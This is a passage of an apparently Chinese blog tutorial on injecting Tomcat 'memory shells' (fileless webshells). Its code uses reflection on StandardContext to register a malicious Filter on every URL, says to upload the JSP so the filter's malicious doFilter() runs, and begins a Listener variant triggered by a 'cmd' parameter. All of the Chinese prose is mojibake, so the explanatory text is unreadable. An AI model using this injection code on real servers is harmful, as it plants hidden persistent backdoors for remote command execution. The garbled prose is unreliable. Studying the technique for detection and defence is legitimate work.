</span></span><span class="line"><span class="cl"><span class="n">filterDef</span><span class="o">.</span><span class="na">setFilterClass</span><span class="o">(</span><span class="n">memShellFilter</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">toString</span><span class="o">());</span>
</span></span><span class="line"><span class="cl"><span class="n">standardContext</span><span class="o">.</span><span class="na">addFilterDef</span><span class="o">(</span><span class="n">filterDef</span><span class="o">);</span>
</span></span></code></pre></div></li>
<li>
<p>Ê†πÊçÆFilterÁöÑÂÆû‰æãÔºåÊûÑÈÄ†FilterMapÔºåÂπ∂Ê∑ªÂä†Âà∞standardContextÁöÑ <code>filterMaps</code> ÁöÑÁ¨¨‰∏Ä‰ΩçÔºõ <!-- raw HTML omitted --></p>
<ul>
<li>filterMapÊú¨Ë∫´ÊòØTomatÈÄöËøáËØªÂèñweb.xml‰∏≠ÁöÑ&lt;filter-mapping&gt;Ê†áÁ≠æÁöÑ‰ø°ÊÅØÊù•Ëé∑ÂèñÁöÑÔºõ <!-- raw HTML omitted --></li>
<li>TomcatÂú®Â§ÑÁêÜËØ∑Ê±ÇÊó∂Ôºå‰ºöÊûÑÈÄ†Êñ∞ÁöÑFilterChainË¥£‰ªªÈìæÔºåËÄåÈÄâÊã©FilterÂä†ÂÖ•Ë¥£‰ªªÈìæÁöÑÊ†áÂáÜÂ∞±ÊòØÊ†πÊçÆFilterMap‰∏≠ÁöÑÈÖçÁΩÆ‰ø°ÊÅØÊù•ÁöÑÔºõ <!-- raw HTML omitted --></li>
<li>URLÁöÑ‰ø°ÊÅØÂ∞±Ë°®Á§∫ÂØπ‰∫éÊâÄÊúâÂú®&quot;/&ldquo;ÁõÆÂΩï‰∏ãÁöÑËµÑÊ∫êÈÉΩÈúÄË¶ÅËøô‰∏™FilterÁöÑËøáÊª§Ôºõ <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// Ê†πÊçÆFilterÊûÑÂª∫‰∏Ä‰∏™Êñ∞ÁöÑfilterMapÂÆû‰æãÔºåÊúÄÂêéÂä†ÂÖ•standardContextÊâÄ‰øùÂ≠òÁöÑfiltermapsÁöÑÊúÄÂâçÁ´ØÔºåÂèØ‰ª•ÊúÄÊó©Ë¢´Ë∞ÉÁî®ÊâßË°å;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FilterMap</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="n">filterMap</span><span class="o">.</span><span class="na">addURLPattern</span><span class="o">(</span><span class="s">&#34;/*&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterMap</span><span class="o">.</span><span class="na">setFilterName</span><span class="o">(</span><span class="n">filterName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterMap</span><span class="o">.</span><span class="na">setDispatcher</span><span class="o">(</span><span class="n">jakarta</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">DispatcherType</span><span class="o">.</span><span class="na">REQUEST</span><span class="o">.</span><span class="na">name</span><span class="o">());</span>
</span></span><span class="line"><span class="cl"><span class="n">standardContext</span><span class="o">.</span><span class="na">addFilterMapBefore</span><span class="o">(</span><span class="n">filterMap</span><span class="o">);</span>
</span></span></code></pre></div></li>
<li>
<p>ÈÄöËøáStandardContextÂèçÂ∞ÑÂæóÂà∞ <code>filterConfigs</code>, Âπ∂Ê†πÊçÆfilterDefÊûÑÈÄ†‰∏Ä‰∏™FilterConfigÂÆû‰æãÂä†ÂÖ•filterConfigs‰∏≠Ôºõ <!-- raw HTML omitted --></p>
<ul>
<li>filterConfigsÊú¨Ë∫´ÊòØÂú®TomcatÂêØÂä®ÁöÑÊó∂ÂÄôÔºåË∞ÉÁî® <code>filterStart()</code> Â∞Ü <strong>filterDef</strong> ËΩ¨ÂåñÊàê <strong>filterConfig</strong> ËÄåÂΩ¢ÊàêÁöÑÔºõ <!-- raw HTML omitted --></li>
<li>ËøôÈáå‰ΩøÁî®ÂèçÂ∞ÑÁöÑÂéüÂõ†‰πüÊòØÂêå‰∏äÔºõ <!-- raw HTML omitted --></li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// Ëé∑ÂèñstandardContextÊâÄ‰øùÂ≠òÁöÑMap: filterConfigs;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Field</span> <span class="n">filterConfigsField</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;filterConfigs&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterConfigsField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">HashMap</span> <span class="n">filterConfigs</span> <span class="o">=</span> <span class="o">(</span><span class="n">HashMap</span><span class="o">)</span> <span class="n">filterConfigsField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">standardContext</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Âà©Áî®ÂèçÂ∞ÑÔºåÈÄöËøá‰πãÂâçÂÆö‰πâÁöÑfilterDefÊûÑÈÄ†‰∏Ä‰∏™Êñ∞ÁöÑfilterConfigÂπ∂Âä†ÂÖ•filterConfigs‰∏≠
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Constructor</span><span class="o">&lt;</span><span class="n">ApplicationFilterConfig</span><span class="o">&gt;</span> <span class="n">declaredConstructor</span> <span class="o">=</span> <span class="n">ApplicationFilterConfig</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">FilterDef</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">declaredConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span> <span class="n">declaredConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">standardContext</span><span class="o">,</span> <span class="n">filterDef</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">filterConfigs</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">filterName</span><span class="o">,</span> <span class="n">filterConfig</span><span class="o">);</span>
</span></span></code></pre></div></li>
<li>
<p>Â∞ÜÊûÑÈÄ†ÁöÑFilterÂÜÖÂ≠òÈ©¨ÁöÑjspÊñá‰ª∂‰∏ä‰º†Âà∞TomcatÔºåÊâßË°åÔºåFilterÊ≥®ÂÜåÊàêÂäüÔºõ <!-- raw HTML omitted --></p>
</li>
<li>
<p>ËÆøÈóÆFilterMap‰∏≠ÊâÄÂÆö‰πâÁöÑË∑ØÂæÑ‰∏ãÁöÑËµÑÊ∫êÔºåTomcatÂ∞±‰ºöÂ∞ÜFilterÂÜÖÂ≠òÈ©¨Ê∑ªÂä†Âà∞Êñ∞ÊûÑÂª∫ÁöÑFilterChain‰∏≠ÔºådoFilter()‰∏≠ÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÂæó‰ª•ÊâßË°å„ÄÇ <!-- raw HTML omitted --></p>
</li>
</ol>
<p><figure><img src="/ox-hugo/2022-10-25_21-44-50_screenshot.png"
         alt="Figure 2: FilterÂÜÖÂ≠òÈ©¨Ê≥®ÂÜå&#43;ÊâßË°åÊàêÂäü" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted -->FilterÂÜÖÂ≠òÈ©¨Ê≥®ÂÜå+ÊâßË°åÊàêÂäü</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<h3 id="Â∞èÁªì">Â∞èÁªì</h3>
<p>Êàë‰ª¨ÈÄöËøá‰ªãÁªç‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑFilterÁ±ª‰ªéÂºÄÂèëÂà∞‰ΩøÁî®Ôºå‰∫ÜËß£‰∫ÜFilterÊòØÂ¶Ç‰ΩïË¢´TomcatÊâÄ‰ΩøÁî®ÁöÑÔºå‰ª•ÂèäÂÖ∂‰∏≠ÊâÄÂåÖÂê´ÁöÑ‰∏Ä‰∫õÈáçË¶ÅÁöÑÊàêÂëòÂèòÈáèÔºõ <!-- raw HTML omitted --></p>
<p>Êé•ÁùÄÊàë‰ª¨ÈÄöËøáÊâãÂä®Â¢ûÂä†Ëøô‰∫õÊàêÂëòÂèòÈáèÔºåÂú®TomcatËøêË°å‰∏≠ÔºåÂä®ÊÄÅÂú∞Âä†ËΩΩÂíåÊ≥®ÂÜå‰∫Ü‰∏Ä‰∏™FilterÔºåÂπ∂ÊàêÂäü‰ΩøÂÖ∂Ë¢´Ë∞ÉÁî®ÊâßË°åÔºõ <!-- raw HTML omitted --></p>
<p>Â∞Ü‰∏ä‰∏ÄÂ∞èËäÇ‰ª•‰∏äÊâÄÊúâÁöÑ‰ª£Á†ÅÁâáÊÆµÊîæÂú®Âêå‰∏Ä‰∏™JSPÊñá‰ª∂‰∏≠Â∞±ÂèØ‰ª•ÂÆåÊàêÊï¥‰∏Ä‰∏™FilterÂÜÖÂ≠òÈ©¨ÔºåËøôÈáåÁØáÂπÖÁöÑÂÖ≥Á≥ªÔºåÂ∞±‰∏çÂÜçÊîæÂÆåÊï¥ÁöÑ‰ª£Á†Å‰∫ÜÔºõ <!-- raw HTML omitted --></p>
<p>ÂÄºÂæó‰∏ÄÊèêÁöÑÊòØÔºå‰∏çÂêåÂ∏àÂÇÖ‰ª¨ÈÉΩÊúâ‰∏çÂêåÁöÑÊûÑÈÄ†FilterÂÜÖÂ≠òÈ©¨ÁöÑÊñπÂºèÔºåÂà©Áî®ÁöÑÂáΩÊï∞ÂíåËøáÁ®ãÈÉΩÂæà‰∏ç‰∏ÄÊ†∑Ôºå‰ΩÜÊú¨Ë¥®Â∫îËØ•ÈÉΩÊ≤°ÊúâÂèòÂåñÔºö <!-- raw HTML omitted --></p>
<ul>
<li>Â∞±ÊòØÂú®Â∑≤Áü•Tomcat‰ºöÂú®Â§ÑÁêÜÊØè‰∏Ä‰∏™ËØ∑Ê±ÇÊó∂ÈáçÊñ∞ÊûÑÈÄ†‰∏Ä‰∏™ <strong>FilterChain</strong> Ë¥£‰ªªÈìæÔºåÂπ∂‰∏îÈÄöËøá <strong>FilterMaps</strong> ÂØπÊâÄÊúâÊ≥®ÂÜåÁöÑ <strong>Filter</strong> ËøõË°åÁ≠õÈÄâÂêéÂä†ÂÖ•Êñ∞ÊûÑÂª∫ÁöÑ <strong>FilterChain</strong>, ‰πãÂêéË∞ÉÁî® <strong>doFilter()</strong> Êù•ÂØπËØ∑Ê±ÇËøõË°åÂ§ÑÁêÜÔºõ <!-- raw HTML omitted --></li>
<li>ÈÇ£‰πàÊàë‰ª¨ÈúÄË¶ÅÂÅöÁöÑÂ∞±ÊòØÔºåÊÉ≥ÂäûÊ≥ïÊûÑÈÄ†‰∏Ä‰∏™ <strong>Filter</strong> Ôºå‰ΩøTomcatÂú®ÊûÑÈÄ†ÁöÑ  <strong>FilterChain</strong> ÁöÑÊó∂ÂÄôÔºåÂÖ∂ÊúâËµÑÊ†ºË¢´ÈÄâ‰∏≠Âä†ÂÖ•ÔºåÂπ∂‰∏îÊã•ÊúâË∂≥Â§üÁöÑÈÖçÁΩÆ‰ø°ÊÅØËÉΩÂ§üÊ≥®ÂÜå‰ª•ÂèäÊâßË°åÂç≥ÂèØÔºõ <!-- raw HTML omitted --></li>
</ul>
<h2 id="listenerÂûã">ListenerÂûã</h2>
<p>Listener‰πüÊòØ‰∏âÂ§ßÁªÑ‰ª∂‰πã‰∏ÄÔºå‰Ωú‰∏∫ÁõëÂê¨Âô®ÔºåÂÖ∂‰ΩúÁî®Â∞±ÊòØÁõëÂê¨Servlet‰∏≠ÁöÑÂêÑÁßç‰∫ã‰ª∂ÁöÑÂèëÁîüÔºå‰ªéËÄåÂÅöÂá∫ÂØπÂ∫îÁöÑÊìç‰ΩúÔºåÊ†πÊçÆListenerÊâÄÁõëÂê¨ÁöÑ‰∫ã‰ª∂ÔºåÂèØ‰ª•ÂàÜ‰∏∫3Á±ªÔºö <!-- raw HTML omitted --></p>
<ol>
<li>ÁõëÂê¨ÂØπË±° <code>ÂàõÂª∫ÂíåÈîÄÊØÅ</code> ÁöÑÁõëÂê¨Âô®Ôºõ <!-- raw HTML omitted --></li>
<li>ÁõëÂê¨ÂØπË±°‰∏≠ <code>Â±ûÊÄßÂèòÊõ¥</code> ÁöÑÁõëÂê¨Âô®Ôºõ <!-- raw HTML omitted --></li>
<li>ÁõëÂê¨ <code>HttpSession</code> ‰∏≠ÁöÑÂØπË±°Áä∂ÊÄÅÊîπÂèòÁöÑÁõëÂê¨Âô®Ôºõ <!-- raw HTML omitted --></li>
</ol>
<p>ÂÖ∂‰∏≠ÔºåServletRequestListenerÊòØÊØîËæÉÁî®Êù•‰Ωú‰∏∫ÂÜÖÂ≠òÈ©¨ÁöÑÔºåÂõ†‰∏∫ÂÖ∂ÁõëÂê¨ÁöÑÊòØ <strong>ServletRequest</strong> ÂØπË±°ÁöÑÂàõÂª∫ÂíåÈîÄÊØÅÔºåÊØèÂΩìÊàë‰ª¨ËÆøÈóÆËµÑÊ∫êÁöÑÊó∂ÂÄôÔºåÈÉΩ‰ºöÁî±ConnectorÂ∞ÅË£ÖÂàõÂª∫‰∏Ä‰∏™ <strong>ServletRequest</strong> ÂØπË±°ÔºåËá™ÁÑ∂‰πüÂ∞±ÂÆπÊòìËß¶Âèë„ÄÇ <!-- raw HTML omitted --></p>
<p>Âú®Êàë‰ª¨ÊûÑÂª∫ListenerÂÜÖÂ≠òÈ©¨‰πãÂâçÔºåÂÖàÊù•ÁúãÁúã‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑListenerÊòØÂ¶Ç‰ΩïË¢´ÂºÄÂèë‰ª•ÂèäÂà©Áî®ÁöÑÂêß„ÄÇ <!-- raw HTML omitted --></p>
<h3 id="ÂºÄÂèëËá™ÂÆö‰πâlistener">ÂºÄÂèëËá™ÂÆö‰πâListener</h3>
<h4 id="ÂºÄÂèëlistenerÁ±ª">ÂºÄÂèëListenerÁ±ª</h4>
<p>Êàë‰ª¨ÂÖàÂÆåÊàêËá™ÂÆö‰πâListenerÁöÑÂºÄÂèëÔºåÂÖ∂ÈúÄË¶ÅÂÆûÁé∞SevletRequestListenerÊé•Âè£ÔºåÂπ∂‰∏îÂÆûÁé∞ <code>requestInitialized()</code> ÊñπÊ≥ïÔºö <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-10-26_09-48-05_screenshot.png"
         alt="Figure 3: Ëá™ÂÆö‰πâServletRequestListenerÁ±ª" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->Ëá™ÂÆö‰πâServletRequestListenerÁ±ª</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<p>Êé•ÁùÄÂú® <code>web.xml</code> ‰∏≠Ê≥®ÂÜåËøô‰∏™ListenerÔºö <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;listener&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;listener-class&gt;</span>com.example.tomcatmemshell.MyListener<span class="nt">&lt;/listener-class&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/listener&gt;</span>
</span></span></code></pre></div><p>‰πãÂêéÔºåÂêØÂä®TomcatÔºåËÆøÈóÆ‰ªªÊÑèËµÑÊ∫êÂ∏¶‰∏äcmdÂèÇÊï∞ÔºåÂç≥ÂèØÂÆûÁé∞ÊïàÊûúÔºö <!-- raw HTML omitted --></p>
<p><figure><img src="/ox-hugo/2022-10-26_09-51-05_screenshot.png"
         alt="Figure 4: ListenerÁõëÂê¨Âπ∂Ë∞ÉÁî®requestInitialized()" width="700px"/><figcaption>
            <p><!-- raw HTML omitted -->Figure 4: <!-- raw HTML omitted -->ListenerÁõëÂê¨Âπ∂Ë∞ÉÁî®requestInitialized()</p>
        </figcaption>
</figure>
 <!-- raw HTML omitted --></p>
<h4 id="tomcatÂêØÂä®Êó∂Ê≥®ÂÜåÂä†ËΩΩlistenerÁ±ª">TomcatÂêØÂä®Êó∂Ê≥®ÂÜåÂä†ËΩΩListenerÁ±ª</h4>
<p>‰∏éFilter‰∏≠‰∏ÄÊ†∑ÔºåTomcatÂú®ÂêØÂä®Êó∂‰ºöÂÖà‰ªé <strong>web.xml</strong> ‰∏≠ËØªÂèñÈÖçÁΩÆ‰ø°ÊÅØÔºå‰ªéËÄåÂä†ËΩΩËá™ÂÆö‰πâÁöÑ <strong>Listener</strong> ‰ø°ÊÅØÔºö <!-- raw HTML omitted --></p>
<p>ConfigureConfigure#configureContext()‰∏≠ListenerÁöÑÈÉ®ÂàÜÁõ∏ÂØπÁÆÄÂçïÔºåÂ∞±ÊòØËØªÂèñ <strong>web.xml</strong> ‰∏≠ÁöÑ <strong>&lt;listener&gt;</strong> ÁöÑÂÜÖÂÆπÔºåÂπ∂Ë∞ÉÁî®StandardContext#addApplicationListenerÊù•‰øùÂ≠òÔºö <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">configureContext</span><span class="o">(</span><span class="n">WebXml</span> <span class="n">webxml</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">           <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">listener</span> <span class="o">:</span> <span class="n">webxml</span><span class="o">.</span><span class="na">getListeners</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">context</span><span class="o">.</span><span class="na">addApplicationListener</span><span class="o">(</span><span class="n">listener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p><strong>addApplicationListener()</strong> Â∞ÜListenerÁöÑÂêçÂ≠ó‰øùÂ≠òÂú® <code>applicationListeners[]</code> Â≠óÁ¨¶‰∏≤Êï∞ÁªÑ‰∏≠Ôºö <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="n">String</span> <span class="n">applicationListeners</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[</span><span class="n">0</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">addApplicationListener</span><span class="o">(</span><span class="n">String</span> <span class="n">listener</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">synchronized</span> <span class="o">(</span><span class="n">applicationListenersLock</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">results</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[</span><span class="n">applicationListeners</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="n">1</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">applicationListeners</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">listener</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">applicationListeners</span><span class="o">[</span><span class="n">i</span><span class="o">]))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">log</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;standardContext.duplicateListener&#34;</span><span class="o">,</span><span class="n">listener</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">results</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">applicationListeners</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">results</span><span class="o">[</span><span class="n">applicationListeners</span><span class="o">.</span><span class="na">length</span><span class="o">]</span> <span class="o">=</span> <span class="n">listener</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">applicationListeners</span> <span class="o">=</span> <span class="n">results</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">fireContainerEvent</span><span class="o">(</span><span class="s">&#34;addApplicationListener&#34;</span><span class="o">,</span> <span class="n">listener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>Êé•ÁùÄÂú®StandardContextË∞ÉÁî®startInternal()ÂêØÂä®Êó∂ÔºåË∞ÉÁî®listenerStart()Êù•ÂàùÂßãÂåñÂíåÂä†ËΩΩÊâÄÊúâÁöÑListenerÔºö <!-- raw HTML omitted --></p>
<ol>
<li>Ê†πÊçÆapplicationListeners‰∏≠‰øùÂ≠òÁöÑÁ±ªÂêçÔºåÂà©Áî®newInstance()Êù•ÂèçÂ∞ÑÊûÑÈÄ†ListenerÂÆû‰æãÔºõ <!-- raw HTML omitted --></li>
<li>Â∞ÜListenerÂÆû‰æãÊåâÁÖßÁ±ªÂà´ÔºàÂÆûÁé∞‰∫Ü‰∏çÂêåÁöÑListenerÊé•Âè£ÔºâÂä†ÂÖ•eventListeners‰ª•ÂèälifecycleListeners; <!-- raw HTML omitted --></li>
</ol>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">listenerStart</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Instantiate the required listeners
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">String</span> <span class="n">listeners</span><span class="o">[]</span> <span class="o">=</span> <span class="n">findApplicationListeners</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">results</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">listeners</span><span class="o">.</span><span class="na">length</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">ok</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">results</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">getLogger</span><span class="o">().</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">getLogger</span><span class="o">().</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34; Configuring event listener class &#39;&#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                    <span class="n">listeners</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">+</span> <span class="s">&#34;&#39;&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// 1. Ê†πÊçÆapplicationListeners‰∏≠‰øùÂ≠òÁöÑÁ±ªÂêçÔºåÂà©Áî®newInstance()Êù•ÂèçÂ∞ÑÊûÑÈÄ†ListenerÂÆû‰æãÔºõ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">String</span> <span class="n">listener</span> <span class="o">=</span> <span class="n">listeners</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">                <span class="n">results</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">getInstanceManager</span><span class="o">().</span><span class="na">newInstance</span><span class="o">(</span><span class="n">listener</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span> <span class="o">...</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 2. Â∞ÜListenerÂÆû‰æãÊåâÁÖßÁ±ªÂà´ÔºàÂÆûÁé∞‰∫Ü‰∏çÂêåÁöÑListenerÊé•Âè£ÔºâÂä†ÂÖ•eventListeners‰ª•Âèä  lifecycleListeners
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">eventListeners</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">        <span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lifecycleListeners</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">Object</span> <span class="n">result</span> <span class="o">:</span> <span class="n">results</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">((</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">ServletContextAttributeListener</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">||</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">ServletRequestAttributeListener</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">||</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">ServletRequestListener</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">||</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">HttpSessionIdListener</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">||</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">HttpSessionAttributeListener</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">eventListeners</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">((</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">ServletContextListener</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                    <span class="o">||</span> <span class="o">(</span><span class="n">result</span> <span class="k">instanceof</span> <span class="n">HttpSessionListener</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">lifecycleListeners</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">result</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">eventListeners</span><span class="o">.</span><span class="na">addAll</span><span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="n">getApplicationEventListeners</span><span class="o">()));</span>
</span></span><span class="line"><span class="cl">        <span class="n">setApplicationEventListeners</span><span class="o">(</span><span class="n">eventListeners</span><span class="o">.</span><span class="na">toArray</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">Object</span> <span class="n">lifecycleListener</span><span class="o">:</span> <span class="n">getApplicationLifecycleListeners</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">lifecycleListeners</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">lifecycleListener</span><span class="o">);</span>
